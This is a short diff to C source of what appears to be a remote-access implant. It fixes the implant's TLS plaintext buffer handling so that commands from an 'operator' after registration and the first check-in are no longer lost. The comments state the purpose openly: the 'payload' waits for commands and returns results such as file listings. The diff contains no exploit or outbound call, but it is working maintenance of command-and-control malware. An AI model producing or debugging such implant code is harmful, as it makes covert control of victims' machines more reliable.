@@ -418,17 +418,27 @@ static void plain_append(const char *data, size_t len) {
         g_tls.plain = (char *)malloc(PLAIN_CAP);
         if (!g_tls.plain) return;
     }
-    if (g_tls.plain_off + g_tls.plain_len + len > PLAIN_CAP) {
-        memmove(g_tls.plain, g_tls.plain + g_tls.plain_off, g_tls.plain_len);
+    /* `plain_len` counts the valid bytes from index 0 and `plain_off` is the
+     * consumed prefix, so new bytes go at `plain_len` — not at
+     * `plain_off + plain_len`, which after one message read would point past
+     * the end of what was written and hand the reader bytes from the wrong
+     * offset. That made the *second* message of every TLS session decrypt to
+     * garbage: registration succeeded, the first check-in reply did not, and
+     * the payload sat waiting for a command that had already been read as
+     * noise. */
+    if (g_tls.plain_len + len > PLAIN_CAP && g_tls.plain_off > 0) {
+        memmove(g_tls.plain, g_tls.plain + g_tls.plain_off,
+                g_tls.plain_len - g_tls.plain_off);
+        g_tls.plain_len -= g_tls.plain_off;
         g_tls.plain_off = 0;
     }
-    if (g_tls.plain_off + g_tls.plain_len + len > PLAIN_CAP) {
+    if (g_tls.plain_len + len > PLAIN_CAP) {
         /* A line longer than the buffer: dropping it is visible to the
          * operator as a command with no result, which beats handing back half
          * of a file listing that reads like all of one. */
         return;
     }
-    memcpy(g_tls.plain + g_tls.plain_off + g_tls.plain_len, data, len);
+    memcpy(g_tls.plain + g_tls.plain_len, data, len);
     g_tls.plain_len += len;
 }
 
@@ -884,7 +894,12 @@ static int transport_read_raw(SOCKET s, unsigned char *out, int cap) {
         int progress = tls_decrypt_once(s);
         if (progress < 0) return -1;
         size_t avail = g_tls.plain_len - g_tls.plain_off;
-        if (avail == 0) return 0;
+        if (avail == 0) {
+            /* Drained. Rewind both indices so the next append writes at 0 and
+             * the reader and writer agree about where the buffer starts. */
+            g_tls.plain_off = g_tls.plain_len = 0;
+            return 0;
+        }
         if (avail > (size_t)cap) avail = (size_t)cap;
         memcpy(out, g_tls.plain + g_tls.plain_off, avail);
         g_tls.plain_off += avail;
